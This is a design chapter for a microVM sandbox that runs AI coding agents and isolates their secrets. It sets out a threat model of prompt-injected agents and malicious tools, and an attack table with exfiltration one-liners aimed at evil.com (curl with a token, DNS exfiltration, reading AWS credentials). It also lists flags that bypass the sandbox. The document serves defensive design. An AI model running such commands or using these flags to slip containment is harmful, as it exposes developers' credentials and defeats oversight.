# 4. Security Model

## 4.1 Formal Threat Model

### Assets to Protect

| Asset | Value | Location |
|-------|-------|----------|
| Developer credentials | SSH keys, API tokens, cloud creds | Host filesystem (`~/.ssh`, `~/.aws`, etc.) |
| Organization secrets | Production DB passwords, signing keys | Secret management backends (Vault, AWS SM) |
| Developer identity | Git signing keys, code signing certs | Host filesystem, hardware tokens |
| Host system integrity | OS, installed software, configs | Host filesystem |
| Network access | Internal services, VPNs, cloud APIs | Host network stack |
| Project source code | The code being worked on | Project directory (shared with VM) |

### Threat Actors

| Actor | Capability | Motivation |
|-------|-----------|------------|
| Prompt-injected agent | Executes arbitrary code inside VM, reads all VM-visible state | Credential theft, data exfiltration, supply chain attack |
| Malicious dependency | Arbitrary code execution during install or import | Credential theft, backdoor installation, cryptomining |
| Compromised MCP tool | Returns malicious instructions to agent | Influence agent to execute exfiltration code |
| Compromised OCI image | Pre-installed malware in base image | Credential theft, persistent backdoor |
| Insider (malicious developer) | Full host access, knows the system | Bypassing Redan to access unscoped secrets |

### What's In Scope

- Protecting host credentials from code running inside the VM
- Enforcing network egress policy at the VM boundary
- Preventing real secret values from being visible inside the VM
- Audit trail of all network and secret-related decisions
- Containing blast radius of prompt injection to the project directory

### What's Explicitly Out of Scope

- **Prompt injection prevention** — unsolved AI problem, not our layer
- **Project directory integrity** — agent has read-write access, git is the safety net
- **Host kernel compromise via VM escape** — we rely on KVM/HVF hypervisor correctness (same trust boundary as AWS Lambda, Podman)
- **Malicious host user** — if the developer is the attacker, Redan can't help (they control the host)
- **Side-channel attacks** — Spectre/Meltdown class attacks between VM and host. Out of scope for v1. Relevant if Redan ever runs multi-tenant.
- **Availability** — agent can crash the VM, consume all allocated resources. This only affects the developer's own session.

## 4.2 Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│  TRUST LEVEL 0: Infrastructure (fully trusted)                  │
│                                                                 │
│  Secret management backends (Vault, AWS SM, etc.)               │
│  Organization policy servers                                    │
│  These are managed by security teams with their own controls.   │
└───────────────────────┬─────────────────────────────────────────┘
                        │ Authenticated API calls
                        │ (TLS, IAM roles, tokens)
┌───────────────────────┴─────────────────────────────────────────┐
│  TRUST LEVEL 1: Host process (trusted, verified)                │
│                                                                 │
│  The Redan binary running on the developer's machine.           │
│  - Authenticates to secret backends                             │
│  - Holds real secret values in memory (never on disk)           │
│  - Enforces network policy                                      │
│  - Manages VM lifecycle                                         │
│  - Writes audit logs                                            │
│                                                                 │
│  Trust basis: developer installed Redan, verified binary hash.  │
│  The host process IS the security enforcement point.            │
└───────────────────────┬─────────────────────────────────────────┘
            ════════════╪═══════════════  HARDWARE BOUNDARY (KVM/HVF)
┌───────────────────────┴─────────────────────────────────────────┐
│  TRUST LEVEL 2: Guest VM (untrusted)                            │
│                                                                 │
│  Everything inside the microVM:                                 │
│  - Guest kernel                                                 │
│  - Agent process (Claude Code, Codex, etc.)                     │
│  - Any code the agent generates and executes                    │
│  - Any packages the agent installs                              │
│  - Any processes spawned by the agent                           │
│                                                                 │
│  Trust basis: NONE. Treated as potentially malicious.           │
│  Cannot access host filesystem, host network, or real secrets.  │
└───────────────────────┬─────────────────────────────────────────┘
                        │ Filtered network (via host proxy)
┌───────────────────────┴─────────────────────────────────────────┐
│  TRUST LEVEL 2: External services (untrusted)                   │
│                                                                 │
│  api.github.com, api.openai.com, etc.                           │
│  Reached only through host proxy. Secrets injected by host.     │
│  Responses flow back to VM unmodified.                          │
└─────────────────────────────────────────────────────────────────┘
```

### Key Trust Boundary: Host Process ↔ Guest VM

This is enforced by the hardware hypervisor (KVM on Linux, HVF on macOS). The guest VM:
- Has its own kernel (from OCI image)
- Cannot access host memory
- Cannot access host filesystem (except explicit virtio-fs mounts)
- Cannot make network connections except through the virtual NIC controlled by the host
- Cannot interact with host hardware except through virtio devices

**Comparison:**

| Boundary | Enforced by | Escape difficulty | Used by |
|----------|-------------|-------------------|---------|
| Docker (namespaces) | Linux kernel | Kernel vuln = escape | Most agents today |
| bubblewrap/Seatbelt | OS primitives | Lower bar than containers | Claude Code sandbox |
| microVM (KVM/HVF) | Hardware hypervisor | Hypervisor vuln = escape | AWS Lambda, Redan |
| Full VM (QEMU) | Hardware hypervisor | Same class as microVM | Gondolin |

## 4.3 Secret Isolation Proof

### Claim
A compromised agent running inside the Redan VM cannot obtain the real value of any secret configured in `redan.toml`.

### Proof Sketch

**Given:**
1. The VM is a hardware-isolated boundary (KVM/HVF). Guest code cannot read host process memory.
2. Real secret values exist only in host process memory. They are never written to disk, never passed to `krun_set_env()`, never placed in any virtio-fs mount.
3. The guest environment variable `$SECRET_NAME` contains a random placeholder token (e.g., `redan_placeholder_a1b2c3d4`).
4. The host network proxy intercepts all egress traffic from the VM (enforced by virtual NIC).
5. The proxy replaces placeholder tokens with real values **only** when `destination ∈ secret.inject_for`.

**Therefore:**
- If the agent reads `$SECRET_NAME`, it gets the placeholder (`redan_placeholder_a1b2c3d4`).
- If the agent sends the placeholder to `api.github.com` (an allowed host), the proxy injects the real value. The agent never sees the real value — it's injected in-flight between the proxy and the destination.
- If the agent sends the placeholder to `evil.com` (not in allowlist), the connection is dropped by the proxy. Even if it weren't dropped, `evil.com` would receive the meaningless placeholder string.
- If the agent tries to extract the secret from the response (e.g., an API that echoes auth headers), the response flows back through the proxy. The proxy does NOT replace real values with placeholders in responses (this is a design choice — see open question below).

**Assumptions:**
- KVM/HVF hypervisor is correctly implemented (no VM escape)
- The host process is not compromised
- The network proxy correctly intercepts all VM egress (enforced by virtual NIC architecture, not bypassable from guest)
- Secret values are properly zeroized in host memory on session teardown

### Attack Scenarios

| Attack | Result | Why |
|--------|--------|-----|
| `cat ~/.aws/credentials` | ENOENT | Host home dir not mounted in VM |
| `echo $GITHUB_TOKEN` | Prints placeholder | Real value only in host memory |
| `curl evil.com -H "Auth: $GITHUB_TOKEN"` | Connection dropped | `evil.com` not in allowlist |
| `curl api.github.com -H "Auth: $GITHUB_TOKEN"` | Works (real token injected by proxy) | Intended use — allowed host |
| `curl api.github.com/echo-headers` | Response may contain real token | See 4.4 — response scrubbing |
| DNS exfil: `dig $GITHUB_TOKEN.evil.com` | Placeholder in DNS query | Real value never in VM |
| Timing side-channel | Theoretical | Out of scope for v1 |
| Memory bus side-channel | Theoretical | Out of scope for v1 |

## 4.4 Response Scrubbing (Open Design Question)

**Problem:** If the proxy injects a real secret into a request, and the remote API echoes it back in the response (e.g., a debugging endpoint that shows received headers), the real secret would be visible inside the VM.

**Options:**

1. **Don't scrub responses (v1 recommendation).** Simple. The secret was sent to an authorized host — the host-to-host communication is trusted. The response is from a host the developer explicitly allowlisted. If the agent extracts the secret from the response, it still can't exfiltrate it (network policy blocks unauthorized hosts). The secret lives in VM memory temporarily, but the VM is ephemeral.

2. **Scrub responses.** Replace any occurrence of real secret values in response bodies/headers with the placeholder. More secure but: performance overhead (scanning all response data), false positives (partial matches), breaks binary protocols, and only works for exact string matching.

3. **Drop echoed headers.** Strip specific headers from responses that are known to echo request headers. Fragile, API-specific.

**Recommendation:** Option 1 for v1. The network policy is the enforcement point, not response scrubbing. Document this as a known property: "Secret values may be visible in responses from authorized hosts within the VM session. They cannot be exfiltrated because network policy prevents sending them to unauthorized hosts."

## 4.5 Network Policy Enforcement

### MITM vs CONNECT Proxy Decision

**MITM Proxy (TLS termination):**
- Host terminates TLS from guest, reads HTTP headers, injects secrets, re-encrypts to destination
- Requires Redan CA cert installed in guest trust store
- Full visibility into HTTP requests (headers, body)
- Breaks certificate pinning in guest applications
- Complexity: high (TLS implementation, CA management, cert generation per destination)

**CONNECT Proxy (tunnel):**
- Guest sends HTTP CONNECT to host proxy
- Host checks destination hostname, allows or denies
- If allowed, tunnel established — host cannot read encrypted content
- Secret injection: NOT possible inside the tunnel (TLS is end-to-end)
- For secret injection: guest must include placeholder in proxy auth headers, or we use a different mechanism

**Hybrid approach (recommended for v1):**
- Use CONNECT proxy for host allowlisting (simple, no TLS complexity)
- For secret injection: the guest includes placeholders in request headers. The host proxy, before establishing the tunnel, doesn't inject there. Instead, secret injection happens at a different layer:
  - Set environment variables in the guest with real (short-lived, scoped) tokens instead of placeholders
  - OR: run a local proxy inside the VM that the agent talks to, which forwards through the host proxy with real secrets added at the host level

Actually, this gets complex. Let me reconsider.

**Revised recommendation: MITM for v1.**

Rationale:
- Secret injection is a core differentiator. Without MITM, we can't inject secrets into HTTPS requests.
- Certificate pinning is rare in the tools agents use (curl, Python requests, Node fetch all respect system CA store).
- MITM complexity is manageable with `rustls` + `rcgen` for on-the-fly cert generation.
- The CA cert is generated per-session (unique per VM boot) and installed in the guest image's trust store.

**Implementation:**
1. On session start, generate ephemeral CA keypair
2. Install CA cert in guest's `/etc/ssl/certs/` via virtio-fs or OCI image overlay
3. For each TLS connection from guest:
   - Extract SNI from ClientHello
   - Check against allowlist
   - If allowed: generate leaf cert for that domain (signed by session CA), terminate guest TLS
   - Read HTTP request, inject secrets into headers if applicable
   - Open real TLS connection to destination, forward request
   - Stream response back through reverse path

### Edge Cases

| Case | Handling |
|------|---------|
| WebSocket upgrade | Allow. After HTTP upgrade, treat as raw tunnel. No further inspection. |
| HTTP/2 | Supported via MITM. h2 crate handles the framing. |
| gRPC | HTTP/2 + protobuf. Proxy handles at HTTP/2 level. Secret injection in `:authority` and custom headers. |
| Non-HTTP TCP (SSH, DB) | Allow/deny by host:port. No content inspection, no secret injection. For SSH: consider agent forwarding from host. |
| QUIC/HTTP/3 | Block in v1 (UDP-based, complex to proxy). Allow in v2 if demand exists. |
| IPv6 | Support in host proxy. Guest may or may not have IPv6 depending on image. |
| Connection to localhost | Block. Prevents guest from reaching host services (metadata, Docker socket, etc.) |
| Connection to link-local (169.254.x.x) | Block. Prevents cloud metadata service access. |
| Connection to private ranges (10.x, 172.16-31.x, 192.168.x) | Block by default. Allow specific ranges via config. |

## 4.6 Escape Hatches

Developers need to bypass restrictions for debugging. This must be explicit, logged, and not the default.

```bash
# Temporary: allow all network for this session (logged as policy override)
redan exec --allow-all-hosts -- bash

# Temporary: mount additional host path (logged)
redan exec --mount /tmp/debug:/debug -- bash

# Permanent: disable Redan for a session (no VM, runs directly)
redan exec --no-sandbox -- claude
# Prints: "WARNING: running without sandbox. All host credentials accessible."
```

**Audit log entries for escapes:**
```jsonl
{"ts":"...","event":"policy_override","override":"allow_all_hosts","session_id":"abc123"}
{"ts":"...","event":"policy_override","override":"no_sandbox","session_id":"abc123"}
```

Enterprise deployments can disable escape hatches via global config:
```toml
# $XDG_CONFIG_HOME/redan/config.toml
[policy]
allow_overrides = false    # CLI flags cannot weaken policy
```

## 4.7 Security Comparison

| Property | Docker | bubblewrap (srt) | gVisor | Redan (microVM) |
|----------|--------|-------------------|--------|------------------|
| Isolation boundary | Linux namespaces | Linux namespaces | User-space kernel | Hardware hypervisor |
| Kernel shared with host | Yes | Yes | Partially (syscall filter) | No (own kernel) |
| Escape requires | Kernel vuln | Kernel vuln | gVisor + kernel vuln | Hypervisor vuln |
| Network enforcement | iptables (bypassable with CAP_NET_ADMIN) | HTTP_PROXY env (bypassable) | Seccomp + netstack | Virtual NIC (not bypassable from guest) |
| Secret isolation | Volume mounts (secrets on disk in container) | Env vars (in process memory) | Same as container | Network-layer injection (never in VM) |
| macOS support | Docker Desktop (Linux VM underneath) | Seatbelt (weaker) | No | HVF via libkrun |
| Overhead | Low (shared kernel) | Minimal | Medium (syscall interception) | Medium (full VM kernel) |

## Key Decisions

1. **MITM proxy for secret injection.** Required for the core value prop. Use ephemeral per-session CA. ✅

2. **Response scrubbing deferred.** Network policy is the enforcement point. Secrets may appear in responses from authorized hosts — acceptable because they can't be exfiltrated. ✅

3. **Block QUIC/HTTP/3 in v1.** Too complex to proxy. Force HTTP/1.1 or HTTP/2 over TCP. ✅

4. **Block localhost and private ranges by default.** Prevent SSRF. Configurable for specific ranges. ✅

5. **Escape hatches available by default, loggable, disableable by enterprise config.** ✅

## Open Questions

1. **Ephemeral CA cert installation:** How do we get the CA cert into the guest trust store without modifying the OCI image? Options: overlay mount on `/etc/ssl/certs/`, inject via environment variable (`SSL_CERT_FILE`), or build into a Redan-specific image layer. Each has compatibility trade-offs with different tools.

2. **Certificate pinning in practice:** Which tools used by agents actually pin certificates? If `npm`, `pip`, `cargo`, `git` all respect system CA store, we're fine. Need to verify.

3. **MITM performance:** TLS termination + re-encryption adds latency. For bulk operations (large npm installs), is this noticeable? Need benchmarking.

4. **Host process memory as attack surface:** Real secrets live in host process memory during the session. If the host has other vulnerabilities (local privilege escalation), secrets could be read from `/proc/<redan_pid>/mem`. Mitigation: `mlock` + `madvise(MADV_DONTDUMP)` for secret pages. Worth doing in v1?
